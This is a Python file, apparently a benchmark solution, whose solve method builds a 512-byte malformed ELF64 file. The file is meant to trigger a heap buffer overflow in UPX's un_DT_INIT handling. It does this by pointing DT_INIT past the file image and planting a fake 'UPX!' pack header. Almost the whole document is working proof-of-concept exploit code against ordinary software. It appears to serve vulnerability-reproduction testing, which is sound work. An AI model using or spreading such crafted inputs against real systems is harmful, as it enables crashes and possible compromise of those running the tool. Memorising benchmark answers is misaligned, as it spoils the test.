import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability in UPX.
        The vulnerability is in PackLinuxElf::un_DT_INIT due to improper bounds checking
        when processing ELF files with specific Dynamic section tags (DT_INIT) and UPX headers.
        """
        
        # Initialize a 512-byte buffer (matching ground-truth length)
        data = bytearray(512)
        
        # --- 1. ELF64 Header ---
        # e_ident: \x7fELF, 64-bit (2), Little Endian (1), Version 1, ABI SysV (0)
        struct.pack_into('4sBBBBB7s', data, 0, b'\x7fELF', 2, 1, 1, 0, 0, b'\x00'*7)
        struct.pack_into('<H', data, 16, 3)      # e_type: ET_DYN (3) - Shared Library
        struct.pack_into('<H', data, 18, 62)     # e_machine: AMD64 (62)
        struct.pack_into('<I', data, 20, 1)      # e_version: 1
        struct.pack_into('<Q', data, 24, 0x1000) # e_entry
        struct.pack_into('<Q', data, 32, 64)     # e_phoff: Program Header Offset
        struct.pack_into('<Q', data, 40, 0)      # e_shoff: Section Header Offset
        struct.pack_into('<I', data, 48, 0)      # e_flags
        struct.pack_into('<H', data, 52, 64)     # e_ehsize: ELF Header Size
        struct.pack_into('<H', data, 54, 56)     # e_phentsize: Program Header Entry Size
        struct.pack_into('<H', data, 56, 2)      # e_phnum: Number of Program Headers
        struct.pack_into('<H', data, 58, 64)     # e_shentsize
        struct.pack_into('<H', data, 60, 0)      # e_shnum
        struct.pack_into('<H', data, 62, 0)      # e_shstrndx
        
        # --- 2. Program Headers ---
        # PHDR 0: PT_LOAD
        # Map the file to memory. File size is small (512), but Mem size is larger to allow "valid" pointers.
        ph_off = 64
        struct.pack_into('<IIQQQQQQ', data, ph_off,
                         1,         # p_type (PT_LOAD)
                         7,         # p_flags (RWE)
                         0,         # p_offset
                         0,         # p_vaddr
                         0,         # p_paddr
                         512,       # p_filesz
                         0x2000,    # p_memsz
                         0x1000)    # p_align

        # PHDR 1: PT_DYNAMIC
        # Points to the Dynamic Section which contains the DT_INIT tag
        ph_off += 56
        dyn_off = 256
        struct.pack_into('<IIQQQQQQ', data, ph_off,
                         2,         # p_type (PT_DYNAMIC)
                         6,         # p_flags (RW)
                         dyn_off,   # p_offset
                         dyn_off,   # p_vaddr
                         dyn_off,   # p_paddr
                         128,       # p_filesz
                         128,       # p_memsz
                         8)         # p_align
        
        # --- 3. Dynamic Section ---
        # The vulnerability exists in un_DT_INIT, which processes the DT_INIT tag.
        # We set DT_INIT to an address (0x1500) that is within p_memsz (0x2000)
        # but corresponds to a file offset > 512, causing OOB access on file_image.
        
        # Entry 1: DT_INIT (Tag 12)
        struct.pack_into('<Qq', data, dyn_off, 12, 0x1500)
        # Entry 2: DT_NULL (Tag 0) terminator
        struct.pack_into('<Qq', data, dyn_off + 16, 0, 0)

        # --- 4. UPX Signature & Header ---
        # UPX detects files by scanning for "UPX!".
        # We place it at offset 128 to trick UPX into attempting to unpack/verify this ELF.
        upx_magic_off = 128
        data[upx_magic_off : upx_magic_off+4] = b'UPX!'
        
        # Mock PackHeader to pass basic checks
        # Layout approximation: version(1), format(1), method(1), level(1)
        data[upx_magic_off+4] = 13  # Version
        data[upx_magic_off+5] = 0   # Format
        data[upx_magic_off+6] = 0   # Method
        data[upx_magic_off+7] = 8   # Level
        
        # u_len (Uncompressed length) and c_len (Compressed length)
        # Large u_len and small c_len common in fuzzing artifacts
        struct.pack_into('<I', data, upx_magic_off+8, 0x1000) 
        struct.pack_into('<I', data, upx_magic_off+12, 0x100)
        
        # Fill remaining space with non-zero pattern to facilitate overflow detection/crash
        for i in range(144, 256):
            data[i] = (i * 7) % 255
            
        return bytes(data)